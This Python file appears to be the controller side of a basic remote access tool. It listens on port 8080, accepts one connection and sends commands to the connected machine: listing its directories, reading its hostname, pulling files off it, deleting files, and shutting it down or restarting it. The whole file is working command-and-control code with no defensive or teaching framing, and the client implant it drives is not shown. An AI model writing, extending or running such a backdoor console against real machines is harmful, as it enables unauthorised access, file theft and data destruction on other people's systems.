import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080
print(host)
s.bind((host,port))

print("")
print(" Server is currently running @ ", host)
print("")
print(" Waiting for any incomming connections...")
s.listen(5)
conn,addr = s.accept()
print("")
print(addr, " Has connected to the server successfully ")

while True:
    print("")
    command = input(str("Command >>"))
    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        print("Command sent waiting for exceution... ")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command Output : ", files)
    
    elif command == "device_name":
        conn.send(command.encode())
        print("")
        print("Command sent waiting for exceution... ")
        print("")
        hostname = conn.recv(5000)
        hostname = hostname.decode()
        print(hostname)

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Custom Dir: "))
        conn.send(user_input.encode())
        print("")
        print("Command has been sent")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Result: ", files)

    elif command == "download_file":
        conn.send(command.encode())
        filespath = input(str("Please Enter the files path including the file name "))
        conn.send(filespath.encode())
        file = conn.recv(100000)
        filename = input("PLease enter a filename for the incoming file including the extension : ")
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename, "Has been downloaded and saved : ")
        print("")
    
    elif command == "remove_file":
        conn.send(command.encode())
        filendir = input("Please enter the filename and dir ")
        conn.send(filendir.encode())
        print("")
        print("File has been deleted successfully : ")
        print("")
    
    elif command == "close":
        conn.send(command.encode())
        print("")
        print("Connection Closed : ")
        print("")
    
    elif command == "turnoff":
        conn.send(command.encode())
        print("")
        print("Shutdown : ")
        print("")

    elif command == "restart":
        conn.send(command.encode())
        print("")
        print("Shutdown : ")
        print("")

    else:
        print("")
        print("Command not recognised")